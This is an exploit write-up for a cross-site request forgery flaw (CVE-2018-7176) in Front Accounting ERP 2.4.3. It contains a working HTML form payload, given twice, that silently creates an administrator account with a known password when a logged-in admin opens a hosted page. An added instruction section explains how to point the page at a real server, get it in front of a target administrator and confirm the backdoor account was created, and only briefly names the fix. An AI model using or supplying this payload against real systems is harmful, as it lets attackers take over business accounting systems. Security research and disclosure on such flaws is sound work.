<!--
​​# Exploit Title: Front Accounting ERP 2.4.3 - CSRF
# Date: 16-02-2018
# Exploit Author: Samrat Das
# Contact: http://twitter.com/Samrat_Das93
# Website: https://securitywarrior9.blogspot.in/
# Vendor Homepage: frontaccounting.com
# Version: 2.4.3
# CVE : CVE-2018-7176
# Category: WebApp ERP

1. Description

The application source code is coded in a way which allows malicious
crafted HTML page to be executed directly without any anti csrf
countermeasures.

2. Proof of Concept

1.       Visit the application
2.       Visit the User Permissions Page.
3.        Goto add user, and create a csrf crafted exploit for the same ,
upon hosting it on a server and sending the link to click by victim, it
gets exploited.

Proof of Concept

Steps to Reproduce:

1. Create an HTML Page with the below exploit code:
-->

<html>
 <body>
    <form action="
http://localhost/frontaccounting/admin/users.php?JsHttpRequest=0-xml"
method="POST" enctype="text/plain">
      <input type="hidden" name="show&#95;inactive"
value="&user&#95;id&#61;Newadmin&password&#61;Newadmin&real&#95;name&#61;New&#37;20Admin&phone&#61;&email&#61;&role&#95;id&#61;8&language&#61;C&pos&#61;1&print&#95;profile&#61;&rep&#95;popup&#61;1&ADD&#95;ITEM&#61;Add&#37;20new&&#95;focus&#61;user&#95;id&&#95;modified&#61;0&&#95;confirmed&#61;&&#95;token&#61;Ta6aiT2xqlL2vg8u9aAvagxx&&#95;random&#61;757897&#46;6552143205"
/>
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

<!--
2  This hosted page upon being clicked by an logged in admin user will lead
to creation of a new malicious admin user.

3 POCs and steps:
https://securitywarrior9.blogspot.in/2018/02/cross-site-request-forgery-front.html

4. Solution:

Implement anti csrf token code in state changing http requests and validate
it at server side.
-->


Instructions:

Front Accounting Installation:

Ensure Front Accounting ERP 2.4.3 is installed and running.
The application should be accessible via the target IP address.

You need to be logged in as an administrator to perform these tests.

Exploit for Creating a Malicious Admin User:

<html>
<body>
   <form action="http://localhost/frontaccounting/admin/users.php?JsHttpRequest=0-xml" method="POST" enctype="text/plain">
     <input type="hidden" name="show_inactive" value="&user_id=Newadmin&password=Newadmin&real_name=New%20Admin&phone=&email=&role_id=8&language=C&pos=1&print_profile=&rep_popup=1&ADD_ITEM=Add%20new&&_focus=user_id&&_modified=0&&_confirmed=&&_token=Ta6aiT2xqlL2vg8u9aAvagxx&&_random=757897.6552143205"/>
     <input type="submit" value="Submit request" />
   </form>
 </body>
</html>

Replace http://localhost with the actual IP address or domain of the Front Accounting server.
Save the code to an HTML file, e.g., csrf_exploit.html.
Host this file on a web server or share it with the target user.

Have an administrator who is logged into Front Accounting visit the hosted HTML page.
Upon visiting the page, the exploit will automatically submit a form to the Front Accounting server.
This will create a new administrator user with the credentials specified in the exploit code.

Log in to the Front Accounting ERP system with an existing admin account.
Navigate to the "Users" or "User Permissions" page.
Verify if the new admin user ("Newadmin") has been created.

Ensure that the application does not have CSRF protections in place by reviewing other state-changing forms or actions in the application.
If CSRF tokens are missing or improperly implemented, this confirms the vulnerability.